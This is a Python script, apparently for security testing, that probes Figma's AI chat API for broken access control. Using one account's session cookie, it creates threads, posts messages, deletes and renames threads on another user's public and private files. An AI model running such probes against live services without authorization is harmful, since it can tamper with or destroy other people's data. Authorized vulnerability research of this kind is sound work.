# -*- coding: utf-8 -*-
"""AI 写接口越权: B(无注入) 对 A 的公开 make 文件 POST 消息/线程
对照: B 对 A 私有 make 文件 → 应 403; B 对自己 → 200 验证格式
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_PUB_MAKE = "QooNP4ZnOkwGbudKlPX635"   # A 的公开 make 文件
A_PRIV_MAKE = "5zb5YkoxMa09KpqOyuLcHD"  # A 的私有 make 文件
B_MAKE = None                            # B 没有 make 文件, 用 B 的 design
B_DESIGN = "xFETb3KJ8wh2U8wjD9jJeY"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')


def call(label, method, path, body=None, query=None, file_key=None):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/", "Cookie": BC}
    if file_key:
        headers["X-Figma-File-Key"] = file_key
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    url = BASE + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} {raw[:250]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} {raw[:250]}")
        return e.code, raw


print("======== 1. B → A 公开 make 文件: AI 写接口 ========")
Q = {"owner_id": A_PUB_MAKE, "owner_type": "file"}
call("create_thread", "POST", "/api/ai_chat/threads", {
    "name": "probe-by-B", "owner_id": A_PUB_MAKE, "owner_type": "file"}, file_key=A_PUB_MAKE)
call("post_message", "POST", "/api/ai_chat/messages", {
    "thread_id": None, "content": "hello from B", "owner_id": A_PUB_MAKE, "owner_type": "file"},
    file_key=A_PUB_MAKE)
call("create_thread2", "POST", "/api/ai_chat/threads", {
    "owner_id": A_PUB_MAKE, "owner_type": "file", "privacy_mode": "file"})
call("create_thread3", "POST", "/api/ai_chat/threads", {
    "owner_id": A_PUB_MAKE, "owner_type": "file", "title": "x"})

print("\n======== 2. B → A 私有 make 文件: 对照 (应 403) ========")
call("create_thread priv", "POST", "/api/ai_chat/threads", {
    "owner_id": A_PRIV_MAKE, "owner_type": "file"}, file_key=A_PRIV_MAKE)

print("\n======== 3. B → 自己 design: 验证格式 ========")
call("create_thread self", "POST", "/api/ai_chat/threads", {
    "owner_id": B_DESIGN, "owner_type": "file"}, file_key=B_DESIGN)

print("\n======== 4. 其他 AI 写形态 ========")
call("DELETE threads", "DELETE", "/api/ai_chat/threads", Q)
call("PATCH threads", "PATCH", "/api/ai_chat/threads", {**Q, "name": "renamed"})
